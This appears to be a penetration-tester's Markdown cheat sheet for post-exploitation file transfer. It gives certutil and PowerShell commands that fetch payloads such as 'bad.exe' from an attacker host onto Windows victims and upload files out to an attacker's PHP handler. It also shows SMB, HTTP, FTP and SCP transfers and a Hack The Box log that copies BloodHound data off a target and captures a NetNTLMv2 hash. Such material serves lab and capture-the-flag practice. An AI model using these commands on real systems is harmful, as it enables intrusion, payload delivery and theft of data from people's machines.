- [Windows File Transfer](#windows-file-transfer)
	- [Certutil](#certutil)
	- [PowerShell](#powershell)
- [Linux File Transfer](#linux-file-transfer)
	- [impacket-smbserver](#impacket-smbserver)
	- [HTTP](#http)
	- [FTP](#ftp)
		- [pyftpdlib](#pyftpdlib)
- [SSH/SCP](#sshscp)


# [Windows File Transfer](#windows-file-transfer-1)
## [Certutil](#certutil-1)
### [Downloading Files with Certutil](https://www.ired.team/offensive-security/defense-evasion/downloading-file-with-certutil)
```sh
certutil.exe -urlcache -f http://10.1.1.1/40564.exe bad.exe
certutil -urlcache -f http://10.1.1.1/40564.exe bad.exe

$t = '10.1.1.1'
certutil -urlcache -f http://$t/40564.exe bad.exe
```
(New-Object Net.WebClient).DownloadFile('http://$t/taskkill.exe','C:\Windows\Temp\taskkill.exe')

## [PowerShell](#powershell-1)
https://gitbook.brainyou.stream/post-exploitation/file-transfer
```sh
powershell (New-Object System.Net.WebClient).UploadFile('http://x.x.x.x/upload.php', '<some_file>')
```

PHP Handler
On Kali, we can make a upload.php:
```php
<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name']
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```

Put the script into /var/www/html. Then do:
```sh
mkdir /var/www/uploads
systemctl start apache
chown www-data: /var/www/uploads
```

# Linux File Transfer
## impacket-smbserver
### [SMB](https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65)
### On Server Side (Kali)
```sh
smbserver.py share . -smb2support
smbserver.py share . -smb2support -username root -password toor
impacket-smbserver share . -smb2support -username root -password toor
impacket-smbserver share . -smb2support -username root -password toor -ip 10.1.1.1
```

```sh
$ impacket-smbserver share .
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

### On Client Side
```sh
C:\Users\bitbucket\Downloads>net use \\10.1.1.1\share
Enter the user name for '10.1.1.1': root
Enter the password for 10.1.1.1: toor
The command completed successfully.
```

```sh
tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors>copy acls.csv \\10.1.1.1\share
        1 file(s) copied.
```

### On Server Side (Kali), received the file
```sh
[*] Incoming connection (10.10.10.77,52853)
[*] AUTHENTICATE_MESSAGE (HTB\tom,REEL)
[*] User REEL\tom authenticated successfully
[*] tom::HTB:aaaaaaaaaaaaaaaa:ce35716473cdd23a96f36ceb04c047b7:01010000000000008001dda490e0d90110624f8984ad10560000000001001000410070004900720061006c006700690003001000410070004900720061006c00670069000200100044005400690049006800610071006f000400100044005400690049006800610071006f00070008008001dda490e0d90106000400020000000800300030000000000000000000000000300000af600118190f818eb191529b8de7b91c47aaab8e73855d44e95d1b6e27fd549f0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003900000000000000000000000000
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:SHARE)
[*] Closing down connection (10.10.10.77,52853)
[*] Remaining connections []

Ctrl + C

$ ls -lh acls.csv                         
-rwxr-xr-x 1 kali kali 110K Jan  1  1970 acls.csv
```

## [HTTP](#http-1)
```sh
python -m http.server
python -m http.server 80
python -m http.server 80 -b 10.1.1.10
```

## [FTP](#ftp-1)
### [pyftpdlib](#pyftpdlib-1)
```sh
pip install pyftpdlib
python -m pyftpdlib -p 21
```

### On Client Side
Use explorer, browser, or cmd
```sh
PS C:\> ftp 10.1.1.1
Connected to 10.1.1.1.
220 pyftpdlib 1.5.9 ready.
530 Log in with USER and PASS first.
User (10.1.1.1:(none)): anonymous
331 Username ok, send password.
Password:
230 Login successful.
ftp> ls
```

# SSH/SCP
### 
```sh
$ ssh -i alice.pem alice1978@$t ls
lin.txt

$ scp -i alice.pem alice1978@$t:~/lin.txt .
lin.txt          100%   59KB 429.8KB/s   00:00
```

### 
```sh

```

### 
```sh

```
# [References](#references-1)

## [UPLOAD DOWNLOAD AND EXECUTE SOME STUFF]
https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/Y%20-%20UL-DL-EXEC%20Skills/README.md